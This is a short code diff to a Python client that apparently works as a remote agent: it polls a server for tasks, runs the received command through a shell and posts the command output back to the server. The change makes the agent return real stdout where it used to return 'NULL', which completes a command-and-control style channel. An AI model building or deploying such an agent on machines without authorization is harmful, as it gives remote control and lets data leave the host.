@@ -51,9 +51,9 @@ class Client:
                 task_id = tasks.get('task_id')
                 print(task)
                 if task == "command":
-                    command = req.json().get('command')
+                    command = tasks.get('command')
                     ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
-                    data = {'agent_id':self.local_ip,'task_id': task_id, 'result': 'NULL','returncode': ps.returncode}
+                    data = {'agent_id':self.local_ip,'task_id': task_id, 'result': ps.stdout,'returncode': ps.returncode}
                     req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
                 elif task == "download":
                     pass
